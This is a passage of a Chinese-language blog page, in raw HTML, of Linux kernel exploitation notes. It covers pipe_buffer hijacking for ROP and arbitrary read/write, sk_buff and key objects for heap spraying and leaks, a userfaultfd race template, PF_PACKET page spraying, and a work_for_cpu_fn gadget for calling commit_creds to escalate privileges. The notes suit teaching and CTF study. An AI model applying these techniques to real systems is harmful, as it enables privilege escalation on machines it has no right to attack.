class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment"> * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment"> * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment"> * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment"> * error.  If not present all pages are considered good.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment"> * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment"> * -&gt;try_steal() returns %true for success, in which case the contents</span></span><br><span class="line"><span class="comment"> * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span></span><br><span class="line"><span class="comment"> * caller. The page may then be transferred to a different mapping, the</span></span><br><span class="line"><span class="comment"> * most often used case is insertion into different file address space</span></span><br><span class="line"><span class="comment"> * cache.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当执行到该指针时 rsi 寄存器刚好指向对应的 <code>pipe_buffer</code>，因此我们可以将函数表劫持到 <code>pipe_buffer</code> 上，找到一条合适的 gadget 将栈迁移到该处，从而更顺利地完成 ROP</p><p><strong>任意地址读写</strong></p><p>管道的读写通过 <code>pipe_buffer[i].page</code> 确定读写的内存，因此若我们能够修改 <code>page</code> 指针，则我们便能完成<strong>对整个物理内存区域的读操作，以及对直接映射区上有写权限的内存区域的写操作</strong></p><h2 id="sk-buff"><a href="#sk-buff" class="headerlink" title="sk_buff"></a>sk_buff</h2><p><strong>申请obj大小:&gt;=512</strong></p><p><strong>GFP_KERNEL_ACCOUNT:否</strong></p><p><strong>功能:堆喷</strong></p><p><code>sk_buff</code> 是 Linux kernel 网络协议栈中一个<strong>重要的基础结构体</strong>，其用以表示在网络协议栈中传输的一个「包」，但其结构体本身不包含一个包的数据部分，而是包含该包的各种属性，<strong>数据包的本体数据则使用一个单独的 object 储存</strong></p><p>这个结构体成员比较多，我们主要关注核心部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="comment">/* These two members must be first. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>*<span class="title">next</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>*<span class="title">prev</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* These elements must be at the end, see alloc_skb() for details.  */</span></span><br><span class="line"><span class="type">sk_buff_data_t</span>tail;</span><br><span class="line"><span class="type">sk_buff_data_t</span>end;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>*head,</span><br><span class="line">*data;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>truesize;</span><br><span class="line"><span class="type">refcount_t</span>users;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SKB_EXTENSIONS</span></span><br><span class="line"><span class="comment">/* only useable after checking -&gt;active_extensions != 0 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_ext</span>*<span class="title">extensions</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>sk_buff</code> 结构体与其所表示的数据包形成如下结构，其中：</p><ul><li><code>head</code> ：一个数据包<strong>实际的起始处</strong>（也就是为该数据包分配的 object 的首地址）</li><li><code>end</code> ：一个数据包实际的末尾（为该数据包分配的 object 的末尾地址）</li><li><code>data</code> ：<strong>当前所在 layer 的数据包对应的起始地址</strong></li><li><code>tail</code> ：<strong>当前所在 layer 的数据包对应的末尾地址</strong></li></ul><p>data 和 tail 可以这么理解：数据包每经过网络层次模型中的一层都会被添加/删除一个 header （有时还有一个 tail），data 与 tail 便是用以对此进行标识的</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/AV8HsnZj2bUCl4J.png" alt=""></p><p>多个 <code>sk_buff</code> 之间形成双向链表结构，类似于 <code>msg_queue</code>，这里同样有一个 <code>sk_buff_head</code> 结构作为哨兵节点</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/U8CjYMBOcZ74s3W.png" alt=""></p><p>在内核网络协议栈中很多地方都会用到该结构体，例如读写 socket 一类的操作都会造成包的创建，其最终都会调用到 <code>alloc_skb()</code> 来分配该结构体，而这个函数又是 <code>__alloc_skb()</code> 的 wrapper，不过需要注意的是其会从<strong>独立的</strong> <code>skbuff_fclone_cache</code>/ <code>skbuff_head_cache</code> 取 object</p><p><code>sk_buff</code> 虽然是从独立的 kmem_cache 中分配的，<strong>但其对应的数据包不是</strong></p><p>因此我们仍然可以实现近乎任意大小 object 的分配与释放</p><p>因此 <code>sk_buff</code> 与 <code>msg_msg</code> 一样常被用来完成堆喷的工作，不同的是 <code>msg_msg</code> 带了一个 header，而 <code>sk_buff</code> 的数据包则带一个 tail——<code>skb_shared_info</code> 结构体</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-02_213558.png" alt=""></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info</span> &#123;</span></span><br><span class="line">__u8flags;</span><br><span class="line">__u8meta_len;</span><br><span class="line">__u8nr_frags;</span><br><span class="line">__u8tx_flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>gso_size;</span><br><span class="line"><span class="comment">/* Warning: this field is not always filled in (UFO)! */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>gso_segs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>*<span class="title">frag_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_hwtstamps</span> <span class="title">hwtstamps</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>gso_type;</span><br><span class="line">u32tskey;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Warning : all fields before dataref are cleared in __alloc_skb()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">atomic_t</span>dataref;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Intermediate layers must ensure that destructor_arg</span></span><br><span class="line"><span class="comment"> * remains valid until skb destructor */</span></span><br><span class="line"><span class="type">void</span> *destructor_arg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* must be last field, see pskb_expand_head() */</span></span><br><span class="line"><span class="type">skb_frag_t</span>frags[MAX_SKB_FRAGS];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>skb_shared_info</code> 结构体的<strong>大小为 320 字节，这意味着我们能够利用分配的 object 最小的大小也得是 512 字节，这无疑为我们的利用增添了几分难度</strong>，但不可否认的是 <code>sk_buff</code> 仍为我们提供了较大对象的任意分配写入与释放</p><p>正所谓有发必有收，我们只需要沿着发送的路径接收该包就能将其释放掉，例如若是我们通过向套接字中写入数据创建了一个包，则从套接字中读出该包便能将其释放</p><h2 id="key"><a href="#key" class="headerlink" title="key"></a>key</h2><p><strong>申请obj大小:任意</strong></p><p><strong>GFP_KERNEL_ACCOUNT:否</strong></p><p><strong>功能:泄露.text|泄露直接映射区地址</strong></p><p>在linux内核中有一套专门用于管理密钥的子系统,负责密钥的创建,读取,更新以及销毁等功能</p><p>内核提供了两个系统调用来负责这些操作</p><p><code>add_key()</code>和<code>keyctl()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">        <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line">        <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">        <span class="type">key_serial_t</span> <span class="title function_">add_key</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *type, <span class="type">const</span> <span class="type">char</span> *description,</span></span><br><span class="line"><span class="params">                                    <span class="type">const</span> <span class="type">void</span> *payload, <span class="type">size_t</span> plen,</span></span><br><span class="line"><span class="params">                                    <span class="type">key_serial_t</span> keyring)</span>;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/unistd.h&gt;</span></span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">       <span class="type">long</span> <span class="title function_">syscall</span><span class="params">(__NR_keyctl, <span class="type">int</span> operation, <span class="type">__kernel_ulong_t</span> arg2,</span></span><br><span class="line"><span class="params">                    <span class="type">__kernel_ulong_t</span> arg3, <span class="type">__kernel_ulong_t</span> arg4,</span></span><br><span class="line"><span class="params">                    <span class="type">__kernel_ulong_t</span> arg5)</span>;</span><br></pre></td></tr></table></figure><p>当调用<code>add_key()</code>创建带有 <code>description</code> 字符串的、类型为 <code>&quot;user&quot;</code> 的、长度为 <code>plen</code> 的内容为 <code>payload</code> 的密钥时</p><ul><li>首先会在内核空间中分配 obj 1 与 obj2，分配 flag 为 <code>GFP_KERNEL</code>，用以保存 <code>description</code> (字符串，最大大小为 4096)、<code>payload</code> (普通数据，大小无限制)</li><li>分配 obj3 保存 <code>description</code> ，分配 obj4 保存 <code>payload</code>，分配 flag 皆为 <code>GFP_KERNEL</code></li><li>释放 obj1 与 obj2，返回密钥 id</li></ul><p>其中 obj4 为一个 <code>user_key_payload</code> 结构体，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU destructor */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>  datalen;    <span class="comment">/* length of this data */</span></span><br><span class="line">    <span class="type">char</span>        data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure><p>由于decription和payload的长度都是可控的,那么<code>obj1-4</code>的大小其实也是可控的</p><p>类似于 <code>msg_msg</code>，<code>user_key_payload</code> 结构体有着一个固定大小的头部，其余空间用来存储来自用户空间的数据（密钥内容）。</p><p><code>keyctl()</code> 系统调用为我们提供了读取、更新（分配新对象，释放旧对象）、销毁密钥（释放 payload）的功能，其中读取的最大长度由 <code>user_key_payload-&gt;datalen</code> 决定</p><p>读取 key 时的 len 应当<strong>不小于 user_key_payload-&gt;datalen，否则会读取失败</strong>,但是可以大于datalen。</p><p>当释放一个密钥时</p><p>内核中，对应的处理流程是<code>_x64_sys_keyctl() -&gt; keyctl_revoke_key() -&gt; key_revoke() -&gt; user_revoke() -&gt; call_rcu()</code>，在<code>call_rcu()</code>函数中将 <code>user_key_payload</code> 结构体的 <code>rcu.func</code> 设置成<code>user_free_payload_rcu()</code>函数的地址</p><h2 id="io-uring"><a href="#io-uring" class="headerlink" title="io_uring"></a>io_uring</h2><p><strong>申请obj大小:任意</strong></p><p><strong>GFP_KERNEL_ACCOUNT:否</strong></p><p><strong>功能:泄露.text|泄露直接映射区地址</strong></p><p>io_uring是自内核版本 5.1 引入的全新的高性能异步 I/O 框架,</p><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><h2 id="userfaultfd-1"><a href="#userfaultfd-1" class="headerlink" title="userfaultfd"></a>userfaultfd</h2><p>userfaultfd配合copy_from_user或者copy_to_user在条件竞争中有着十分强大的作用</p><p>其作用就是监控在某一段内存中发生的页错误,并且可以由用户指定如何处理</p><p>一般情况下我们选择使用sleep()或者pause()等函数使该线程停下,这样让我们完成条件竞争构造uaf等,提供了十分便利的条件</p><p>不过在大概<code>5.11</code>版本前后,由于变量<code>sysctl_unprivileged_userfaultfd</code>不再被初识赋值为1,使得userfaultfd不再能被非root用户使用</p><p>一个模板:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">userfaultfd_stuck_handler</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> uffd = (<span class="type">unsigned</span> <span class="type">long</span>) arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler created&quot;</span>);</span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler unblocked&quot;</span>);</span><br><span class="line">    pause();</span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* page = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="comment">//这部分是缺页异常处理得到的页的内容填充</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RegisterUserfault</span><span class="params">(<span class="type">void</span> *fault_page, <span class="type">void</span>* handler)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features    = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)fault_page; <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>) <span class="comment">//注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//开一个线程，接收错误的信号，然后处理</span></span><br><span class="line">    <span class="type">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="type">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    RegisterUserfault(stuck_mapped_memory, userfaultfd_stuck_handler);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="pgv页级分配"><a href="#pgv页级分配" class="headerlink" title="pgv页级分配"></a>pgv页级分配</h2><h2 id="setsockopt"><a href="#setsockopt" class="headerlink" title="setsockopt"></a>setsockopt</h2><p>当创建一个协议为<code>PF_PACKET</code>的socket时,如下</p><p><code>socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</code></p><p>如果再先调用 <code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为 <code>TPACKET_V1</code>或者<code>TPACKET_V2</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span> &#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>即</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> version = TPACKET_V1;</span><br><span class="line">setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, &amp;version, <span class="keyword">sizeof</span>(version));</span><br></pre></td></tr></table></figure><p>那么之后当我们创建如下这样一个结构体时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_nr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再调用<code>PACKET_TX_RING</code>或者<code>PACKET_RX_RING</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line"></span><br><span class="line">req.tp_block_size = size;</span><br><span class="line">req.tp_block_nr = nr;</span><br><span class="line">req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br></pre></td></tr></table></figure><p>之后便会分配<code>tp_frame_nr</code>个页框,并且是直接从伙伴系统中提取</p><p>并且当关闭socket时,会将这些页框释放</p><p>最后需要注意的是</p><blockquote><p>需要注意的是低权限用户无法创建一个类型为 <code>SOCK_RAW</code> 协议为 <code>PF_PACKET</code> 的 socket，但是我们可以通过开辟新的命名空间来绕过该限制，不过这样也有一定的缺陷：我们的进程也被隔离到该进程里了，无法获得“真正的 root 权限”</p><p>因此我们最好的做法便是开辟一个子进程，在该子进程中开辟新命名空间专门进行堆喷，父进程/其他子进程用于提权，通过管道与该子进程进行交互</p></blockquote><h2 id="modprobe-path"><a href="#modprobe-path" class="headerlink" title="modprobe_path"></a>modprobe_path</h2><h1 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h1><h2 id="work-for-cpu-fn"><a href="#work-for-cpu-fn" class="headerlink" title="work_for_cpu_fn"></a>work_for_cpu_fn</h2><p>一个十分神奇的gadget</p><p>源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line"><span class="type">long</span> (*fn)(<span class="type">void</span> *);</span><br><span class="line"><span class="type">void</span> *arg;</span><br><span class="line"><span class="type">long</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">work_for_cpu_fn</span><span class="params">(<span class="keyword">struct</span> work_struct *work)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> *<span class="title">wfc</span> =</span> container_of(work, <span class="keyword">struct</span> work_for_cpu, work);</span><br><span class="line"></span><br><span class="line">wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到其会有如下调用</p><p><code>*(arg+0x30)=*(arg+0x20)(*(arg+0x28))</code></p><p>也就是说这个函数不经能够劫持实现任意函数调用,同时还能存储返回值(nb嘞)</p><blockquote><p>该函数位于 workqueue 机制的实现中，只要是开启了多核支持的内核 （CONFIG_SMP）都会包含这个函数的代码。不难注意到，这个函数非常好用，只要能控制第一个参数指向的内存，即可实现带一个任意参数调用任意函数，并把返回值存回第一个参数指向的内存的功能，且该 “gadget” 能干净的返回，执行的过程中完全不用管 SMAP、SMEP 的事情。由于内核中大量的 read / write / ioctl 之类的实现的第一个参数也都恰好是对应的对象本身，可谓是非常的适合这种场景了。考虑到我们提权需要做的事情只是 commit_creds(prepare_kernel_cred(0))，完全可以用两次上述的函数调用原语实现。（如果还需要禁用 SELinux 之类的，再找一个任意地址写 0 的 gadget 即可，很容易找）</p></blockquote><h1 id="奇技淫巧"><a href="#奇技淫巧" 